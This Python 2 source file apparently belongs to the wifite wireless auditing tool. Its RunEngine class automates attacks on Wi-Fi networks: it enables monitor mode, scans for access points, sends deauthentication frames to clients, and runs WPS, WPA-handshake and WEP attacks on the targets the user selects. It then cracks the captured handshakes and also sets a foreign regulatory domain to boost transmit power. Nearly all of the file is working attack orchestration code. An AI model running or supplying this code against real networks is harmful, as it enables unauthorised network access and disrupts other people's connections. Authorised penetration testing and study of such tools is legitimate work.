class RunEngine:
    def __init__(self, run_config):
        self.RUN_CONFIG = run_config
        self.RUN_CONFIG.RUN_ENGINE = self

    def initial_check(self):
        """
            Ensures required programs are installed.
        """
        airs = ['aircrack-ng', 'airodump-ng', 'aireplay-ng', 'airmon-ng', 'packetforge-ng']
        for air in airs:
            if program_exists(air): continue
            print R+' [!]'+O+' required program not found: %s' % (R+air+W)
            print R+' [!]'+O+' this program is bundled with the aircrack-ng suite:'+W
            print R+' [!]'+O+'        '+C+'http://www.aircrack-ng.org/'+W
            print R+' [!]'+O+' or: '+W+'sudo apt-get install aircrack-ng\n'+W
            self.RUN_CONFIG.exit_gracefully(1)

        if not program_exists('iw'):
            print R+' [!]'+O+' airmon-ng requires the program %s\n' % (R+'iw'+W)
            self.RUN_CONFIG.exit_gracefully(1)

        printed = False
        # Check reaver
        if not program_exists('reaver'):
            printed = True
            print R+' [!]'+O+' the program '+R+'reaver'+O+' is required for WPS attacks'+W
            print R+'    '+O+'   available at '+C+'http://code.google.com/p/reaver-wps'+W
            self.RUN_CONFIG.WPS_DISABLE = True
        elif not program_exists('walsh') and not program_exists('wash'):
            printed = True
            print R+' [!]'+O+' reaver\'s scanning tool '+R+'walsh'+O+' (or '+R+'wash'+O+') was not found'+W
            print R+' [!]'+O+' please re-install reaver or install walsh/wash separately'+W

        # Check handshake-checking apps
        recs = ['tshark', 'pyrit', 'cowpatty']
        for rec in recs:
            if program_exists(rec): continue
            printed = True
            print R+' [!]'+O+' the program %s is not required, but is recommended%s' % (R+rec+O, W)
        if printed: print ''

    def enable_monitor_mode(self, iface):
        """
            First attempts to anonymize the MAC if requested; MACs cannot
			be anonymized if they're already in monitor mode.
            Uses airmon-ng to put a device into Monitor Mode.
            Then uses the get_iface() method to retrieve the new interface's name.
            Sets global variable IFACE_TO_TAKE_DOWN as well.
            Returns the name of the interface in monitor mode.
        """
        mac_anonymize(iface)
        print GR+' [+]'+W+' enabling monitor mode on %s...' % (G+iface+W),
        stdout.flush()
        call(['airmon-ng', 'start', iface], stdout=DN, stderr=DN)
        print 'done'
        self.RUN_CONFIG.WIRELESS_IFACE = ''  # remove this reference as we've started its monitoring counterpart
        self.RUN_CONFIG.IFACE_TO_TAKE_DOWN = self.get_iface()
        if self.RUN_CONFIG.TX_POWER > 0:
            print GR+' [+]'+W+' setting Tx power to %s%s%s...' % (G, self.RUN_CONFIG.TX_POWER, W),
            call(['iw', 'reg', 'set', 'BO'], stdout=OUTLOG, stderr=ERRLOG)
            call(['iwconfig', iface, 'txpower', self.RUN_CONFIG.TX_POWER], stdout=OUTLOG, stderr=ERRLOG)
            print 'done'
        return self.RUN_CONFIG.IFACE_TO_TAKE_DOWN

    def disable_monitor_mode(self):
        """
            The program may have enabled monitor mode on a wireless interface.
            We want to disable this before we exit, so we will do that.
        """
        if self.RUN_CONFIG.IFACE_TO_TAKE_DOWN == '': return
        print GR+' [+]'+W+' disabling monitor mode on %s...' % (G+self.RUN_CONFIG.IFACE_TO_TAKE_DOWN+W),
        stdout.flush()
        call(['airmon-ng', 'stop', self.RUN_CONFIG.IFACE_TO_TAKE_DOWN], stdout=DN, stderr=DN)
        print 'done'

    def rtl8187_fix(self, iface):
        """
            Attempts to solve "Unknown error 132" common with RTL8187 devices.
            Puts down interface, unloads/reloads driver module, then puts iface back up.
            Returns True if fix was attempted, False otherwise.
        """
        # Check if current interface is using the RTL8187 chipset
        proc_airmon = Popen(['airmon-ng'], stdout=PIPE, stderr=DN)
        proc_airmon.wait()
        using_rtl8187 = False
        for line in proc_airmon.communicate()[0].split():
            line = line.upper()
            if line.strip() == '' or line.startswith('INTERFACE'): continue
            if line.find(iface.upper()) and line.find('RTL8187') != -1: using_rtl8187 = True

        if not using_rtl8187:
            # Display error message and exit
            print R+' [!]'+O+' unable to generate airodump-ng CSV file'+W
            print R+' [!]'+O+' you may want to disconnect/reconnect your wifi device'+W
            self.RUN_CONFIG.exit_gracefully(1)

        print O+" [!]"+W+" attempting "+O+"RTL8187 'Unknown Error 132'"+W+" fix..."

        original_iface = iface
        # Take device out of monitor mode
        airmon = Popen(['airmon-ng', 'stop', iface], stdout=PIPE, stderr=DN)
        airmon.wait()
        for line in airmon.communicate()[0].split('\n'):
            if line.strip() == '' or \
               line.startswith("Interface") or \
               line.find('(removed)') != -1:
                continue
            original_iface = line.split()[0] # line[:line.find('\t')]

        # Remove drive modules, block/unblock ifaces, probe new modules.
        print_and_exec(['ifconfig', original_iface, 'down'])
        print_and_exec(['rmmod', 'rtl8187'])
        print_and_exec(['rfkill', 'block', 'all'])
        print_and_exec(['rfkill', 'unblock', 'all'])
        print_and_exec(['modprobe', 'rtl8187'])
        print_and_exec(['ifconfig', original_iface, 'up'])
        print_and_exec(['airmon-ng', 'start', original_iface])

        print '\r                                                        \r',
        print O+' [!] '+W+'restarting scan...\n'

        return True

    def get_iface(self):
        """
            Get the wireless interface in monitor mode.
            Defaults to only device in monitor mode if found.
            Otherwise, enumerates list of possible wifi devices
            and asks user to select one to put into monitor mode (if multiple).
            Uses airmon-ng to put device in monitor mode if needed.
            Returns the name (string) of the interface chosen in monitor mode.
        """
        if not self.RUN_CONFIG.PRINTED_SCANNING:
            print GR+' [+]'+W+' scanning for wireless devices...'
            self.RUN_CONFIG.PRINTED_SCANNING = True

        proc  = Popen(['iwconfig'], stdout=PIPE, stderr=DN)
        iface = ''
        monitors = []
        adapters = []
        for line in proc.communicate()[0].split('\n'):
            if len(line) == 0: continue
            if ord(line[0]) != 32: # Doesn't start with space
                iface = line[:line.find(' ')] # is the interface
            if line.find('Mode:Monitor') != -1:
                monitors.append(iface)
            else: adapters.append(iface)

        if self.RUN_CONFIG.WIRELESS_IFACE != '':
            if monitors.count(self.RUN_CONFIG.WIRELESS_IFACE): return self.RUN_CONFIG.WIRELESS_IFACE
            else:
                if self.RUN_CONFIG.WIRELESS_IFACE in adapters:
                    # valid adapter, enable monitor mode
                    print R+' [!]'+O+' could not find wireless interface %s in monitor mode' % (R+'"'+R+self.RUN_CONFIG.WIRELESS_IFACE+'"'+O)
                    return self.enable_monitor_mode(self.RUN_CONFIG.WIRELESS_IFACE)
                else:
                    # couldnt find the requested adapter
                    print R+' [!]'+O+' could not find wireless interface %s' % ('"'+R+self.RUN_CONFIG.WIRELESS_IFACE+O+'"'+W)
                    self.RUN_CONFIG.exit_gracefully(0)

        if len(monitors) == 1:
            return monitors[0] # Default to only device in monitor mode
        elif len(monitors) > 1:
            print GR+" [+]"+W+" interfaces in "+G+"monitor mode:"+W
            for i, monitor in enumerate(monitors):
                print "  %s. %s" % (G+str(i+1)+W, G+monitor+W)
            ri = raw_input("%s [+]%s select %snumber%s of interface to use for capturing (%s1-%d%s): %s" % \
                      (GR,     W,       G,       W,                              G, len(monitors), W, G))
            while not ri.isdigit() or int(ri) < 1 or int(ri) > len(monitors):
                ri = raw_input("%s [+]%s select number of interface to use for capturing (%s1-%d%s): %s" % \
                         (GR,   W,                                              G, len(monitors), W, G))
            i = int(ri)
            return monitors[i - 1]

        proc  = Popen(['airmon-ng'], stdout=PIPE, stderr=DN)
        for line in proc.communicate()[0].split('\n'):
            if len(line) == 0 or line.startswith('Interface'): continue
            monitors.append(line)
       	
        if len(monitors) == 0:
            print R+' [!]'+O+" no wireless interfaces were found."+W
            print R+' [!]'+O+" you need to plug in a wifi device or install drivers.\n"+W
            self.RUN_CONFIG.exit_gracefully(0)
        elif self.RUN_CONFIG.WIRELESS_IFACE != '' and monitors.count(self.RUN_CONFIG.WIRELESS_IFACE) > 0:
            return self.enable_monitor_mode(monitor)

        elif len(monitors) == 1:
            monitor = monitors[0][:monitors[0].find('\t')]
            return self.enable_monitor_mode(monitor)

        print GR+" [+]"+W+" available wireless devices:"
        for i, monitor in enumerate(monitors):
            print "  %s%d%s. %s" % (G, i + 1, W, monitor)

        ri = raw_input(GR+" [+]"+W+" select number of device to put into monitor mode (%s1-%d%s): " % (G, len(monitors), W))
        while not ri.isdigit() or int(ri) < 1 or int(ri) > len(monitors):
            ri = raw_input(" [+] select number of device to put into monitor mode (%s1-%d%s): " % (G, len(monitors), W))
        i = int(ri)
        monitor = monitors[i-1][:monitors[i-1].find('\t')]

        return self.enable_monitor_mode(monitor)

    def scan(self, channel=0, iface='', tried_rtl8187_fix=False):
        """
            Scans for access points. Asks user to select target(s).
                "channel" - the channel to scan on, 0 scans all channels.
                "iface"   - the interface to scan on. must be a real interface.
                "tried_rtl8187_fix" - We have already attempted to fix "Unknown error 132"
            Returns list of selected targets and list of clients.
        """
        remove_airodump_files(self.RUN_CONFIG.temp + 'wifite')

        command = ['airodump-ng',
                   '-a', # only show associated clients
                   '-w', self.RUN_CONFIG.temp + 'wifite'] # output file
        if channel != 0:
            command.append('-c')
            command.append(str(channel))
        command.append(iface)

        proc = Popen(command, stdout=DN, stderr=DN)

        time_started = time.time()
        print GR+' [+] '+G+'initializing scan'+W+' ('+G+iface+W+'), updates at 5 sec intervals, '+G+'CTRL+C'+W+' when ready.'
        (targets, clients) = ([], [])
        try:
            deauth_sent = 0.0
            old_targets = []
            stop_scanning = False
            while True:
                time.sleep(0.3)
                if not os.path.exists(self.RUN_CONFIG.temp + 'wifite-01.csv') and time.time() - time_started > 1.0:
                    print R+'\n [!] ERROR!'+W
                    # RTL8187 Unknown Error 132 FIX
                    if proc.poll() != None: # Check if process has finished
                        proc = Popen(['airodump-ng', iface], stdout=DN, stderr=PIPE)
                        if not tried_rtl8187_fix and proc.communicate()[1].find('failed: Unknown error 132') != -1:
                            send_interrupt(proc)
                            if self.rtl8187_fix(iface):
                                return self.scan(channel=channel, iface=iface, tried_rtl8187_fix=True)
                    print R+' [!]'+O+' wifite is unable to generate airodump-ng output files'+W
                    print R+' [!]'+O+' you may want to disconnect/reconnect your wifi device'+W
                    self.RUN_CONFIG.exit_gracefully(1)

                (targets, clients) = self.parse_csv(self.RUN_CONFIG.temp + 'wifite-01.csv')

                # Remove any already cracked networks if configured to do so
                if self.RUN_CONFIG.SHOW_ALREADY_CRACKED == False:
                    index = 0
                    while index < len(targets):
                        already = False
                        for cracked in self.RUN_CONFIG.CRACKED_TARGETS:
                            if targets[index].ssid.lower() == cracked.ssid.lower():
                                already = True
                            if targets[index].bssid.lower() == cracked.bssid.lower():
                                already = True
                        if already == True:
                            targets.pop(index)
                            index -= 1
                        index += 1

                # If we are targeting a specific ESSID/BSSID, skip the scan once we find it.
                if self.RUN_CONFIG.TARGET_ESSID != '':
                    for t in targets:
                        if t.ssid.lower() == self.RUN_CONFIG.TARGET_ESSID.lower():
                            send_interrupt(proc)
                            try: os.kill(proc.pid, SIGTERM)
                            except OSError: pass
                            except UnboundLocalError: pass
                            targets = [t]
                            stop_scanning = True
                            break
                if self.RUN_CONFIG.TARGET_BSSID != '':
                    for t in targets:
                        if t.bssid.lower() == self.RUN_CONFIG.TARGET_BSSID.lower():
                            send_interrupt(proc)
                            try: os.kill(proc.pid, SIGTERM)
                            except OSError: pass
                            except UnboundLocalError: pass
                            targets = [t]
                            stop_scanning = True
                            break

                # If user has chosen to target all access points, wait 20 seconds, then return all
                if self.RUN_CONFIG.ATTACK_ALL_TARGETS and time.time() - time_started > 10:
                    print GR+'\n [+]'+W+' auto-targeted %s%d%s access point%s' % (G, len(targets), W, '' if len(targets) == 1 else 's')
                    stop_scanning = True

                if self.RUN_CONFIG.ATTACK_MIN_POWER > 0 and time.time() - time_started > 10:
                    # Remove targets with power < threshold
                    i = 0
                    before_count = len(targets)
                    while i < len(targets):
                        if targets[i].power < self.RUN_CONFIG.ATTACK_MIN_POWER:
                            targets.pop(i)
                        else: i += 1
                    print GR+'\n [+]'+W+' removed %s targets with power < %ddB, %s remain' % \
                                    (G+str(before_count - len(targets))+W, self.RUN_CONFIG.ATTACK_MIN_POWER, G+str(len(targets))+W)
                    stop_scanning = True

                if stop_scanning: break

                # If there are unknown SSIDs, send deauths to them.
                if channel != 0 and time.time() - deauth_sent > 5:
                    deauth_sent = time.time()
                    for t in targets:
                        if t.ssid == '':
                            print "\r %s deauthing hidden access point (%s)               \r" % \
                                  (GR+sec_to_hms(time.time() - time_started)+W, G+t.bssid+W),
                            stdout.flush()
                            # Time to deauth
                            cmd = ['aireplay-ng',
                                   '--ignore-negative-one',
                                   '--deauth', str(self.RUN_CONFIG.WPA_DEAUTH_COUNT),
                                   '-a', t.bssid]
                            for c in clients:
                                if c.station == t.bssid:
                                    cmd.append('-c')
                                    cmd.append(c.bssid)
                                    break
                            cmd.append(iface)
                            proc_aireplay = Popen(cmd, stdout=DN, stderr=DN)
                            proc_aireplay.wait()
                            time.sleep(0.5)
                        else:
                            for ot in old_targets:
                                if ot.ssid == '' and ot.bssid == t.bssid:
                                    print '\r %s successfully decloaked "%s"                     ' % \
                                            (GR+sec_to_hms(time.time() - time_started)+W, G+t.ssid+W)

                    old_targets = targets[:]
                if self.RUN_CONFIG.VERBOSE_APS and len(targets) > 0:
                    targets = sorted(targets, key=lambda t: t.power, reverse=True)
                    if not self.RUN_CONFIG.WPS_DISABLE:
                        wps_check_targets(targets, self.RUN_CONFIG.temp + 'wifite-01.cap', verbose=False)

                    os.system('clear')
                    print GR+'\n [+] '+G+'scanning'+W+' ('+G+iface+W+'), updates at 5 sec intervals, '+G+'CTRL+C'+W+' when ready.\n'
                    print "   NUM ESSID                 %sCH  ENCR  POWER  WPS?  CLIENT" % ('BSSID              ' if self.RUN_CONFIG.SHOW_MAC_IN_SCAN else '')
                    print '   --- --------------------  %s--  ----  -----  ----  ------' % ('-----------------  ' if self.RUN_CONFIG.SHOW_MAC_IN_SCAN else '')
                    for i, target in enumerate(targets):
                        print "   %s%2d%s " % (G, i + 1, W),
                        # SSID
                        if target.ssid == '':
                            p = O+'('+target.bssid+')'+GR+' '+W
                            print '%s' % p.ljust(20),
                        elif ( target.ssid.count('\x00') == len(target.ssid) ):
                            p = '<Length '+str(len(target.ssid))+'>'
                            print '%s' % C+p.ljust(20)+W,
                        elif len(target.ssid) <= 20:
                            print "%s" % C+target.ssid.ljust(20)+W,
                        else:
                            print "%s" % C+target.ssid[0:17] + '...'+W,
                        # BSSID
                        if self.RUN_CONFIG.SHOW_MAC_IN_SCAN:
                            print O,target.bssid+W,
                        # Channel
                        print G+target.channel.rjust(3),W,
                        # Encryption
                        if target.encryption.find("WEP") != -1: print G,
                        else:                                   print O,
                        print "\b%3s" % target.encryption.strip().ljust(4) + W,
                        # Power
                        if target.power >= 55:   col = G
                        elif target.power >= 40: col = O
                        else:                    col = R
                        print "%s%3ddb%s" % (col,target.power, W),
                        # WPS
                        if self.RUN_CONFIG.WPS_DISABLE:
                            print "  %3s" % (O+'n/a'+W),
                        else:
                            print "  %3s" % (G+'wps'+W if target.wps else R+' no'+W),
                        # Clients
                        client_text = ''
                        for c in clients:
                            if c.station == target.bssid:
                                if client_text == '': client_text = 'client'
                                elif client_text[-1] != "s": client_text += "s"
                        if client_text != '': print '  %s' % (G+client_text+W)
                        else: print ''
                    print ''
                print ' %s %s wireless networks. %s target%s and %s client%s found   \r' % (
                      GR+sec_to_hms(time.time() - time_started)+W, G+'scanning'+W,
                      G+str(len(targets))+W, '' if len(targets) == 1 else 's',
                      G+str(len(clients))+W, '' if len(clients) == 1 else 's'),

                stdout.flush()
        except KeyboardInterrupt:
            pass
        print ''

        send_interrupt(proc)
        try: os.kill(proc.pid, SIGTERM)
        except OSError: pass
        except UnboundLocalError: pass

        # Use "wash" program to check for WPS compatibility
        if not self.RUN_CONFIG.WPS_DISABLE:
            wps_check_targets(targets, self.RUN_CONFIG.temp + 'wifite-01.cap')

        remove_airodump_files(self.RUN_CONFIG.temp + 'wifite')

        if stop_scanning: return (targets, clients)
        print ''

        if len(targets) == 0:
            print R+' [!]'+O+' no targets found!'+W
            print R+' [!]'+O+' you may need to wait for targets to show up.'+W
            print ''
            self.RUN_CONFIG.exit_gracefully(1)

        if self.RUN_CONFIG.VERBOSE_APS: os.system('clear')

        # Sort by Power
        targets = sorted(targets, key=lambda t: t.power, reverse=True)

        victims = []
        print "   NUM ESSID                 %sCH  ENCR  POWER  WPS?  CLIENT" % ('BSSID              ' if self.RUN_CONFIG.SHOW_MAC_IN_SCAN else '')
        print '   --- --------------------  %s--  ----  -----  ----  ------' % ('-----------------  ' if self.RUN_CONFIG.SHOW_MAC_IN_SCAN else '')
        for i, target in enumerate(targets):
            print "   %s%2d%s " % (G, i + 1, W),
            # SSID
            if target.ssid == '':
                p = O+'('+target.bssid+')'+GR+' '+W
                print '%s' % p.ljust(20),
            elif ( target.ssid.count('\x00') == len(target.ssid) ):
                p = '<Length '+str(len(target.ssid))+'>'
                print '%s' % C+p.ljust(20)+W,
            elif len(target.ssid) <= 20:
                print "%s" % C+target.ssid.ljust(20)+W,
            else:
                print "%s" % C+target.ssid[0:17] + '...'+W,
            # BSSID
            if self.RUN_CONFIG.SHOW_MAC_IN_SCAN:
                print O,target.bssid+W,
            # Channel
            print G+target.channel.rjust(3),W,
            # Encryption
            if target.encryption.find("WEP") != -1: print G,
            else:                                   print O,
            print "\b%3s" % target.encryption.strip().ljust(4) + W,
            # Power
            if target.power >= 55:   col = G
            elif target.power >= 40: col = O
            else:                    col = R
            print "%s%3ddb%s" % (col,target.power, W),
            # WPS
            if self.RUN_CONFIG.WPS_DISABLE:
                print "  %3s" % (O+'n/a'+W),
            else:
                print "  %3s" % (G+'wps'+W if target.wps else R+' no'+W),
            # Clients
            client_text = ''
            for c in clients:
                if c.station == target.bssid:
                    if client_text == '': client_text = 'client'
                    elif client_text[-1] != "s": client_text += "s"
            if client_text != '': print '  %s' % (G+client_text+W)
            else: print ''

        ri = raw_input(GR+"\n [+]"+W+" select "+G+"target numbers"+W+" ("+G+"1-%s)" % (str(len(targets))+W) + \
                             " separated by commas, or '%s': " % (G+'all'+W))
        if ri.strip().lower() == 'all':
            victims = targets[:]
        else:
            for r in ri.split(','):
                r = r.strip()
                if r.find('-') != -1:
                    (sx, sy) = r.split('-')
                    if sx.isdigit() and sy.isdigit():
                        x = int(sx)
                        y = int(sy) + 1
                        for v in xrange(x, y):
                            victims.append(targets[v - 1])
                elif not r.isdigit() and r.strip() != '':
                    print O+" [!]"+R+" not a number: %s " % (O+r+W)
                elif r != '':
                    victims.append(targets[int(r) - 1])

        if len(victims) == 0:
            print O+'\n [!] '+R+'no targets selected.\n'+W
            self.RUN_CONFIG.exit_gracefully(0)

        print ''
        print ' [+] %s%d%s target%s selected.' % (G, len(victims), W, '' if len(victims) == 1 else 's')

        return (victims, clients)

    def Start(self):
        self.RUN_CONFIG.CreateTempFolder()
        self.RUN_CONFIG.handle_args()
        self.RUN_CONFIG.ConfirmRunningAsRoot()
        self.RUN_CONFIG.ConfirmCorrectPlatform()

        self.initial_check() # Ensure required programs are installed.

        # The "get_iface" method anonymizes the MAC address (if needed)
        # and puts the interface into monitor mode.
        iface = self.get_iface()
        self.RUN_CONFIG.THIS_MAC = get_mac_address(iface) # Store current MAC address

        (targets, clients) = self.scan(iface=iface, channel=self.RUN_CONFIG.TARGET_CHANNEL)

        try:
            index = 0
            while index < len(targets):
                target = targets[index]
                # Check if we have already cracked this target
                for already in RUN_CONFIG.CRACKED_TARGETS:
                    if already.bssid == targets[index].bssid:
                        if RUN_CONFIG.SHOW_ALREADY_CRACKED == True:
                            print R+'\n [!]'+O+' you have already cracked this access point\'s key!'+W
                            print R+' [!] %s' % (C+already.ssid+W+': "'+G+already.key+W+'"')
                            ri = raw_input(GR+' [+] '+W+'do you want to crack this access point again? ('+G+'y/'+O+'n'+W+'): ')
                            if ri.lower() == 'n':
                                targets.pop(index)
                                index -= 1
                        else:
                            targets.pop(index)
                            index -= 1
                        break

                # Check if handshakes already exist, ask user whether to skip targets or save new handshakes
                handshake_file = RUN_CONFIG.WPA_HANDSHAKE_DIR + os.sep + re.sub(r'[^a-zA-Z0-9]', '', target.ssid) \
                                 + '_' + target.bssid.replace(':', '-') + '.cap'
                if os.path.exists(handshake_file):
                    print R+'\n [!] '+O+'you already have a handshake file for %s:' % (C+target.ssid+W)
                    print '        %s\n' % (G+handshake_file+W)
                    print GR+' [+]'+W+' do you want to '+G+'[s]kip'+W+', '+O+'[c]apture again'+W+', or '+R+'[o]verwrite'+W+'?'
                    ri = 'x'
                    while ri != 's' and ri != 'c' and ri != 'o':
                        ri = raw_input(GR+' [+] '+W+'enter '+G+'s'+W+', '+O+'c,'+W+' or '+R+'o'+W+': '+G).lower()
                    print W+"\b",
                    if ri == 's':
                        targets.pop(index)
                        index -= 1
                    elif ri == 'o':
                        remove_file(handshake_file)
                        continue
                index += 1


        except KeyboardInterrupt:
            print '\n '+R+'(^C)'+O+' interrupted\n'
            self.RUN_CONFIG.exit_gracefully(0)

        wpa_success = 0
        wep_success = 0
        wpa_total   = 0
        wep_total   = 0

        self.RUN_CONFIG.TARGETS_REMAINING = len(targets)
        for t in targets:
            self.RUN_CONFIG.TARGETS_REMAINING -= 1

            # Build list of clients connected to target
            ts_clients = []
            for c in clients:
                if c.station == t.bssid:
                    ts_clients.append(c)

            print ''
            if t.encryption.find('WPA') != -1:
                need_handshake = True
                if not self.RUN_CONFIG.WPS_DISABLE and t.wps:
                    wps_attack = WPSAttack(iface, t, self.RUN_CONFIG)
                    need_handshake = not wps_attack.RunAttack()
                    wpa_total += 1

                if not need_handshake: wpa_success += 1
                if self.RUN_CONFIG.TARGETS_REMAINING < 0: break

                if not self.RUN_CONFIG.WPA_DISABLE and need_handshake:
                    wpa_total += 1
                    wpa_attack = WPAAttack(iface, t, ts_clients, self.RUN_CONFIG)
                    if wpa_attack.RunAttack():
                        wpa_success += 1

            elif t.encryption.find('WEP') != -1:
                wep_total += 1
                wep_attack = WEPAttack(iface, t, ts_clients, self.RUN_CONFIG)
                if wep_attack.RunAttack():
                    wep_success += 1

            else: print R+' unknown encryption:',t.encryption,W

            # If user wants to stop attacking
            if self.RUN_CONFIG.TARGETS_REMAINING <= 0: break

        if wpa_total + wep_total > 0:
            # Attacks are done! Show results to user
            print ''
            print GR+' [+] %s%d attack%s completed:%s' % (G, wpa_total + wep_total, '' if wpa_total+wep_total == 1 else 's', W)
            print ''
            if wpa_total > 0:
                if wpa_success == 0:           print GR+' [+]'+R,
                elif wpa_success == wpa_total: print GR+' [+]'+G,
                else:                          print GR+' [+]'+O,
                print '%d/%d%s WPA attacks succeeded' % (wpa_success, wpa_total, W)

                for finding in self.RUN_CONFIG.WPA_FINDINGS:
                    print '        ' + C+finding+W

            if wep_total > 0:
                if wep_success == 0:           print GR+' [+]'+R,
                elif wep_success == wep_total: print GR+' [+]'+G,
                else:                          print GR+' [+]'+O,
                print '%d/%d%s WEP attacks succeeded' % (wep_success, wep_total, W)

                for finding in self.RUN_CONFIG.WEP_FINDINGS:
                    print '        ' + C+finding+W

            caps = len(self.RUN_CONFIG.WPA_CAPS_TO_CRACK)
            if caps > 0 and not self.RUN_CONFIG.WPA_DONT_CRACK:
                print GR+' [+]'+W+' starting '+G+'WPA cracker'+W+' on %s%d handshake%s' % (G, caps, W if caps == 1 else 's'+W)
                for cap in self.RUN_CONFIG.WPA_CAPS_TO_CRACK:
                    wpa_crack(cap)

        print ''
        self.RUN_CONFIG.exit_gracefully(0)

    def parse_csv(self, filename):
        """
            Parses given lines from airodump-ng CSV file.
            Returns tuple: List of targets and list of clients.
        """
        if not os.path.exists(filename): return ([], [])
        targets = []
        clients = []
        try:
            hit_clients = False
            with open(filename, 'rb') as csvfile:
                targetreader = csv.reader((line.replace('\0','') for line in csvfile), delimiter=',')
                for row in targetreader:
                    if len(row) < 2:
                        continue
                    if not hit_clients:
                        if len(row) < 14:
                            continue
                        if row[0].strip() == 'Station MAC':
                            hit_clients = True
                        if row[0].strip() == 'BSSID' or row[0].strip() == 'Station Mac': continue
                        enc = row[5].strip()
                        wps = False
                        if enc.find('WPA') == -1 and enc.find('WEP') == -1: continue
                        if self.RUN_CONFIG.WEP_DISABLE and enc.find('WEP') != -1: continue
                        if self.RUN_CONFIG.WPA_DISABLE and self.RUN_CONFIG.WPS_DISABLE and enc.find('WPA') != -1: continue
                        if enc == "WPA2WPA":
                            enc = "WPA2"
                            wps = True
                        power = int(row[8].strip())

                        ssid = row[13].strip()
                        ssidlen = int(row[12].strip())
                        ssid = ssid[:ssidlen]

                        if power < 0: power += 100
                        t = Target(row[0].strip(), power, row[10].strip(), row[3].strip(), enc, ssid)
                        t.wps = wps
                        targets.append(t)
                    else:
                        if len(row) < 6:
                            continue
                        bssid   = re.sub(r'[^a-zA-Z0-9:]', '', row[0].strip())
                        station = re.sub(r'[^a-zA-Z0-9:]', '', row[5].strip())
                        power   = row[3].strip()
                        if station != 'notassociated':
                            c = Client(bssid, station, power)
                            clients.append(c)
        except IOError as e:
            print "I/O error({0}): {1}".format(e.errno, e.strerror)
            return ([], [])

        return (targets, clients)

    def analyze_capfile(self, capfile):
        """
            Analyzes given capfile for handshakes using various programs.
            Prints results to console.
        """
        # we're not running an attack
        wpa_attack = WPAAttack(None, None, None)

        if self.RUN_CONFIG.TARGET_ESSID == '' and self.RUN_CONFIG.TARGET_BSSID == '':
            print R+' [!]'+O+' target ssid and bssid are required to check for handshakes'
            print R+' [!]'+O+' please enter essid (access point name) using -e <name>'
            print R+' [!]'+O+' and/or target bssid (mac address) using -b <mac>\n'
            # exit_gracefully(1)

        if self.UN_CONFIG.TARGET_BSSID == '':
            # Get the first BSSID found in tshark!
            self.RUN_CONFIG.TARGET_BSSID = get_bssid_from_cap(self.RUN_CONFIG.TARGET_ESSID, capfile)
            # if TARGET_BSSID.find('->') != -1: TARGET_BSSID == ''
            if self.RUN_CONFIG.TARGET_BSSID == '':
                print R+' [!]'+O+' unable to guess BSSID from ESSID!'
            else:
                print GR+' [+]'+W+' guessed bssid: %s' % (G+self.RUN_CONFIG.TARGET_BSSID+W)

        if self.RUN_CONFIG.TARGET_BSSID != '' and self.RUN_CONFIG.TARGET_ESSID == '':
            self.RUN_CONFIG.TARGET_ESSID = get_essid_from_cap(self.RUN_CONFIG.TARGET_BSSID, capfile)

        print GR+'\n [+]'+W+' checking for handshakes in %s' % (G+capfile+W)

        t = Target(self.RUN_CONFIG.TARGET_BSSID, '', '', '', 'WPA', self.RUN_CONFIG.TARGET_ESSID)

        if program_exists('pyrit'):
            result = wpa_attack.has_handshake_pyrit(t, capfile)
            print GR+' [+]'+W+'    '+G+'pyrit'+W+':\t\t\t %s' % (G+'found!'+W if result else O+'not found'+W)
        else: print R+' [!]'+O+' program not found: pyrit'
        if program_exists('cowpatty'):
            result = wpa_attack.has_handshake_cowpatty(t, capfile, nonstrict=True)
            print GR+' [+]'+W+'    '+G+'cowpatty'+W+' (nonstrict):\t %s' % (G+'found!'+W if result else O+'not found'+W)
            result = wpa_attack.has_handshake_cowpatty(t, capfile, nonstrict=False)
            print GR+' [+]'+W+'    '+G+'cowpatty'+W+' (strict):\t %s' % (G+'found!'+W if result else O+'not found'+W)
        else: print R+' [!]'+O+' program not found: cowpatty'
        if program_exists('tshark'):
            result = wpa_attack.has_handshake_tshark(t, capfile)
            print GR+' [+]'+W+'    '+G+'tshark'+W+':\t\t\t %s' % (G+'found!'+W if result else O+'not found'+W)
        else: print R+' [!]'+O+' program not found: tshark'
        if program_exists('aircrack-ng'):
            result = wpa_attack.has_handshake_aircrack(t, capfile)
            print GR+' [+]'+W+'    '+G+'aircrack-ng'+W+':\t\t %s' % (G+'found!'+W if result else O+'not found'+W)
        else: print R+' [!]'+O+' program not found: aircrack-ng'

        print ''

        self.RUN_CONFIG.exit_gracefully(0)
